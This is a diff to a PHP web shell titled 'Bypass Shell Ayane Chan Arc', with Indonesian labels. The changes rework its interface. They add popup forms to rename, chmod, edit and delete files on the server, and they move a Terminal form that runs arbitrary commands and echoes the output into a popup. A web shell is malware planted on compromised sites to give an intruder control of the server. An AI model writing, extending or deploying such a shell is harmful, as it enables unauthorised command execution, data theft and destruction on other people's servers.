@@ -24,7 +24,7 @@ function playAudio() {
 
 if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
     echo '
-<style>
+    <style>
         body {
             background-color: pink;
             height: 100vh;
@@ -32,13 +32,14 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
             display: flex;
             justify-content: center;
             align-items: center;
+            font-family: Arial, sans-serif;
         }
         .login-card {
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0,0,0,0.1);
             padding: 20px;
-            max-width: 400px;
-            width: 100%;
+            max-width: 90%;
+            width: 400px;
             text-align: center;
             background-color: white;
         }
@@ -76,7 +77,6 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
             </div>
             <button type="submit" class="btn btn-primary">Login</button>
         </form>
-        </div>
     </div>';
     exit;
 }
@@ -122,23 +122,105 @@ function display_path_links($dir) {
             echo "<a href='?dir=" . urlencode($folderPath) . "' class='btn btn-link'>$folder/</a>";
             echo "<span class='ml-auto'>" . get_permissions($dir . '/' . $folder) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($dir . '/' . $folder)) . "</span>";
-            echo "<button type='button' class='btn btn-warning btn-sm ml-2' data-toggle='modal' data-target='#renameModal' data-source='" . htmlspecialchars($dir . '/' . $folder) . "'>Ganti Nama</button>";
-            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' data-toggle='modal' data-target='#chmodModal' data-source='" . htmlspecialchars($dir . '/' . $folder) . "' data-permission='" . substr(sprintf('%o', fileperms($dir . '/' . $folder)), -4) . "'>Ubah Chmod</button>";
-            echo "<button type='button' class='btn btn-danger btn-sm ml-2 delete-btn' data-path='" . htmlspecialchars($dir . '/' . $folder) . "'>Hapus</button>";
+            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
+            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
+            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$folder')\">Hapus</button>";
             echo "</div>";
+
+            // Rename Form
+            echo "<div id='rename-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ganti Nama</h4>
+                        <label for='destination'><b>Nama Baru</b></label>
+                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
+                        <input type='hidden' name='source' value='$folderPath'>
+                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$folder')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Chmod Form
+            echo "<div id='chmod-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ubah Chmod</h4>
+                        <label for='mode'><b>Mode Chmod</b></label>
+                        <input type='text' placeholder='0755' name='mode' required>
+                        <input type='hidden' name='source' value='$folderPath'>
+                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$folder')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Delete Confirmation
+            echo "<div id='delete-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Hapus Folder</h4>
+                        <p>Apakah Anda yakin ingin menghapus folder ini?</p>
+                        <input type='hidden' name='path' value='$folderPath'>
+                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$folder')\">Batal</button>
+                    </form>
+                </div>";
         }
 
         foreach ($files as $file) {
+            $filePath = htmlspecialchars($dir . '/' . $file);
             echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
             echo "<span>$file</span>";
-            echo "<span class='ml-auto'>" . get_permissions($dir . '/' . $file) . "</span>";
-            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($dir . '/' . $file)) . "</span>";
-            echo "<button type='button' class='btn btn-warning btn-sm ml-2' data-toggle='modal' data-target='#renameModal' data-source='" . htmlspecialchars($dir . '/' . $file) . "'>Ganti Nama</button>";
-            echo "<button type='button' class='btn btn-secondary btn-sm ml-2' data-toggle='modal' data-target='#chmodModal' data-source='" . htmlspecialchars($dir . '/' . $file) . "' data-permission='" . substr(sprintf('%o', fileperms($dir . '/' . $file)), -4) . "'>Ubah Chmod</button>";
-            echo "<button type='button' class='btn btn-primary btn-sm ml-2' data-toggle='modal' data-target='#editModal' data-source='" . htmlspecialchars($dir . '/' . $file) . "'>Edit</button>";
-            echo "<button type='button' class='btn btn-danger btn-sm ml-2 delete-btn' data-path='" . htmlspecialchars($dir . '/' . $file) . "'>Hapus</button>";
-            echo "<a href='?download=" . urlencode($dir . '/' . $file) . "' class='btn btn-info btn-sm ml-2'>Download</a>";
+            echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
+            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
+            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
+            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
+            echo "<button class='btn btn-primary btn-sm ml-2' onclick=\"showForm('edit-$file')\">Edit</button>";
+            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$file')\">Hapus</button>";
+            echo "<a href='?download=" . urlencode($filePath) . "' class='btn btn-info btn-sm ml-2'>Download</a>";
             echo "</div>";
+
+            // Rename Form
+            echo "<div id='rename-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ganti Nama</h4>
+                        <label for='destination'><b>Nama Baru</b></label>
+                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
+                        <input type='hidden' name='source' value='$filePath'>
+                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Chmod Form
+            echo "<div id='chmod-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ubah Chmod</h4>
+                        <label for='mode'><b>Mode Chmod</b></label>
+                        <input type='text' placeholder='0755' name='mode' required>
+                        <input type='hidden' name='source' value='$filePath'>
+                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Edit Form
+            echo "<div id='edit-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Edit File</h4>
+                        <textarea name='content' rows='10' class='form-control'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
+                        <input type='hidden' name='editSource' value='$filePath'>
+                        <button type='submit' name='saveEdit' class='btn btn-primary'>Simpan</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('edit-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Delete Confirmation
+            echo "<div id='delete-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Hapus File</h4>
+                        <p>Apakah Anda yakin ingin menghapus file ini?</p>
+                        <input type='hidden' name='path' value='$filePath'>
+                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$file')\">Batal</button>
+                    </form>
+                </div>";
         }
     } else {
         echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
@@ -190,11 +272,18 @@ function get_permissions($file) {
 
 function deleteItem($path) {
     if (is_dir($path)) {
-        rmdir($path);
+        if (rmdir($path)) {
+            echo "<div class='alert alert-success'>Direktori berhasil dihapus.</div>";
+        } else {
+            echo "<div class='alert alert-danger'>Gagal menghapus direktori.</div>";
+        }
     } else {
-        unlink($path);
+        if (unlink($path)) {
+            echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
+        } else {
+            echo "<div class='alert alert-danger'>Gagal menghapus file.</div>";
+        }
     }
-    echo "<div class='alert alert-success'>Item berhasil dihapus.</div>";
 }
 
 function renameFile($source, $destination) {
@@ -260,8 +349,8 @@ if (isset($_POST['chmod']) && isset($_POST['source']) && isset($_POST['mode'])) 
     changePermissions($source, $mode);
 }
 
-if (isset($_POST['edit']) && isset($_POST['source']) && isset($_POST['content'])) {
-    $source = $_POST['source'];
+if (isset($_POST['saveEdit']) && isset($_POST['editSource']) && isset($_POST['content'])) {
+    $source = $_POST['editSource'];
     $content = $_POST['content'];
     editFile($source, $content);
 }
@@ -301,9 +390,92 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bypass Shell Ayane Chan Arc</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: pink;
+            font-family: Arial, sans-serif;
+        }
+        .container-box {
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            overflow-y: auto;
+            max-height: 100vh;
+        }
+        .form-popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9;
+            background-color: white;
+            border: 1px solid #888;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0px 0px 10px 0px #000;
+        }
+
+        .form-container h4 {
+            margin-bottom: 15px;
+        }
+
+        .form-container input[type=text], .form-container textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 10px 0;
+            border: none;
+            background: #f1f1f1;
+        }
+
+        .form-container .btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom:10px;
+            opacity: 0.8;
+        }
+
+        .form-container .btn.cancel {
+            background-color: red;
+        }
+
+        .form-container .btn:hover, .open-button:hover {
+            opacity: 1;
+        }
+
+        .terminal-output {
+            background-color: #f0f0f0;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        @media screen and (min-width: 600px) {
+            .form-popup {
+                max-width: 400px;
+            }
+        }
+    </style>
 </head>
-<body style="background-color: pink;">
-    <div class="container mt-5">
+<body>
+    <div class="container-box">
         <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
         <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
         <div class="text-center mb-4">
@@ -311,7 +483,24 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         </div>
         <form method="post" class="text-center mb-4">
             <button type="submit" name="logout" class="btn btn-danger">Logout</button>
+            <button type="button" class="btn btn-info" onclick="showForm('terminalForm')">Terminal</button>
         </form>
+
+        <div id="terminalForm" class="form-popup">
+            <form method="post" class="form-container">
+                <h4>Terminal</h4>
+                <label for="command"><b>Command</b></label>
+                <input type="text" placeholder="Masukkan perintah" name="command" required>
+                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
+                <button type="submit" class="btn btn-primary">Jalankan</button>
+                <button type="button" class="btn btn-secondary" onclick="hideForm('terminalForm')">Batal</button>
+            </form>
+            <?php if (isset($commandOutput)): ?>
+            <div class="terminal-output">
+                <?php echo $commandOutput; ?>
+            </div>
+            <?php endif; ?>
+        </div>
 
         <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
         <form method="post">
@@ -354,174 +543,21 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             ?>
         </div>
 
-        <h2 class="mt-4">Terminal</h2>
-        <form method="post">
-            <div class="form-group">
-                <label for="command">Command</label>
-                <input type="text" id="command" name="command" class="form-control" placeholder="Masukkan perintah" required>
-            </div>
-            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
-            <button type="submit" class="btn btn-primary">Jalankan</button>
-        </form>
-        <?php if (isset($commandOutput)): ?>
-            <pre class="mt-4"><?php echo $commandOutput; ?></pre>
-        <?php endif; ?>
-
         <footer class="text-center mt-4">
             <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc. Semua hak cipta dilindungi.</small>
         </footer>
-
-        <!-- Modal untuk rename file -->
-        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
-            <div class="modal-dialog">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title" id="renameModalLabel">Ganti Nama File</h5>
-                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                            <span aria-hidden="true">&times;</span>
-                        </button>
-                    </div>
-                    <form method="post">
-                        <div class="modal-body">
-                            <input type="hidden" id="source" name="source">
-                            <div class="form-group">
-                                <label for="destination">Nama Baru</label>
-                                <input type="text" id="destination" name="destination" class="form-control" placeholder="Masukkan nama baru" required>
-                            </div>
-                        </div>
-                        <div class="modal-footer">
-                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
-                            <button type="submit" name="rename" class="btn btn-primary">Ganti Nama</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-        <!-- Modal untuk chmod file -->
-        <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
-            <div class="modal-dialog">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title" id="chmodModalLabel">Ubah Chmod File</h5>
-                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                            <span aria-hidden="true">&times;</span>
-                        </button>
-                    </div>
-                    <form method="post">
-                        <div class="modal-body">
-                            <input type="hidden" id="chmodSource" name="source">
-                            <div class="form-group">
-                                                                <label for="mode">Mode Chmod</label>
-                                <input type="text" id="mode" name="mode" class="form-control" placeholder="Contoh: 0755" required>
-                            </div>
-                        </div>
-                        <div class="modal-footer">
-                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
-                            <button type="submit" name="chmod" class="btn btn-primary">Ubah Chmod</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-
-        <!-- Modal untuk edit file -->
-        <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
-            <div class="modal-dialog modal-lg">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title" id="editModalLabel">Edit File</h5>
-                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                            <span aria-hidden="true">&times;</span>
-                        </button>
-                    </div>
-                    <form method="post">
-                        <div class="modal-body">
-                            <input type="hidden" id="editSource" name="source">
-                            <div class="form-group">
-                                <label for="content">Konten File</label>
-                                <textarea id="content" name="content" class="form-control" rows="10" required></textarea>
-                            </div>
-                        </div>
-                        <div class="modal-footer">
-                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Tutup</button>
-                            <button type="submit" name="edit" class="btn btn-primary">Simpan Perubahan</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-
         <?php else: ?>
         <!-- Konten halaman login jika belum terautentikasi -->
         <?php endif; ?>
     </div>
-
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <script>
-        $('#renameModal').on('show.bs.modal', function (event) {
-            var button = $(event.relatedTarget) // Button that triggered the modal
-            var source = button.data('source') // Extract info from data-* attributes
-            var modal = $(this)
-            modal.find('.modal-body #source').val(source)
-        })
+        function showForm(formId) {
+            document.getElementById(formId).style.display = 'block';
+        }
 
-        $('#chmodModal').on('show.bs.modal', function (event) {
-            var button = $(event.relatedTarget) // Button that triggered the modal
-            var source = button.data('source') // Extract info from data-* attributes
-            var permission = button.data('permission')
-            var modal = $(this)
-            modal.find('.modal-body #chmodSource').val(source)
-            modal.find('.modal-body #mode').val(permission)
-        })
-
-        $('#editModal').on('show.bs.modal', function (event) {
-            var button = $(event.relatedTarget) // Button that triggered the modal
-            var source = button.data('source') // Extract info from data-* attributes
-            var modal = $(this)
-            modal.find('.modal-body #editSource').val(source)
-
-            $.ajax({
-                url: source,
-                method: 'GET',
-                success: function (data) {
-                    modal.find('.modal-body #content').val(data)
-                }
-            })
-        })
-
-        $('.delete-btn').on('click', function (event) {
-            var path = $(this).data('path');
-            if (confirm('Apakah Anda yakin ingin menghapus ' + path + '?')) {
-                $.post('', { delete: true, path: path }, function () {
-                    location.reload();
-                });
-            }
-        });
-        
-      document.addEventListener("DOMContentLoaded", function() {
-    // Ensure that the login card is vertically and horizontally centered
-    function centerLoginCard() {
-        var loginCard = document.querySelector(".login-card");
-        var windowHeight = window.innerHeight;
-        var cardHeight = loginCard.offsetHeight;
-        var marginTop = (windowHeight - cardHeight) / 2;
-
-        loginCard.style.marginTop = marginTop + "px";
-    }
-
-    // Initial centering
-    centerLoginCard();
-
-    // Re-center on window resize
-    window.addEventListener("resize", function() {
-        centerLoginCard();
-    });
-});
-
+        function hideForm(formId) {
+            document.getElementById(formId).style.display = 'none';
+        }
     </script>
 </body>
 </html>
-                              
